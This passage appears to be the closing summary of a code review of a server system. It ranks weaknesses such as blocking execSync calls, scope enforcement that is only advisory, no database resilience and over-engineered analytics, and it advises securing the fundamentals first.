2. 🔴 **Blocking I/O via `execSync`** — Makes the server unusable for real workloads  
3. 🔴 **Scope enforcement is advisory-only** — Core promise unfulfilled
4. 🟡 **No database resilience** — Inevitable data loss
5. 🟡 **Over-engineered analytics** (AEGIS/scorecards) with under-engineered fundamentals (YAML parsing, error codes)

The system has the right vision but has invested in advanced features (instinct lifecycle, trace analysis, AEGIS proposals) before solidifying the basics (security, async I/O, real enforcement). **Nail the foundation first, then build upward.**
